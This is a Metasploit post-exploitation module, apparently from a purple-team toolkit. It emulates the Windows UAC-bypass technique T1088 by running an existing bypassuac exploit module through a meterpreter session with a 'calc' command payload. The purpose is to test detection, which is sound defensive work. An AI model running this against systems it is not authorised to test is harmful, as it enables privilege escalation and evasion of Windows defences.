##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Bypass UAC (T1088) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Privilege Escalation:
                        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1088' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'exploit/windows/local/bypassuac_injection_winsxs']),
      OptString.new('COMMAND', [ true, "Command to execute", "calc"]),
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      if client.arch == ARCH_X86
        framework_mod.datastore['TARGET'] = 0
        framework_mod.datastore['PAYLOAD'] = 'windows/exec'
      else
        framework_mod.datastore['TARGET'] = 1
        framework_mod.datastore['PAYLOAD'] = 'windows/x64/exec'
      end
      framework_mod.datastore['CMD'] = datastore['COMMAND']
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework.datastore['ExitOnSession'] = false
      framework_mod.exploit_simple(
          'LocalInput'    => self.user_input,
          'LocalOutput'   => self.user_output,
          'RunAsJob'  => true)
  end

  def run
    return 0 if session.type != "meterpreter"

    mod = datastore['MODULE']

    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        print_status("Killing calc")
        kill_calc
        run_module(mod)
        sleep(2)
        kill_calc(true)
        print_good("Module T1088W execution successful.")
      rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1088W execution failed.")
      end
  end
end
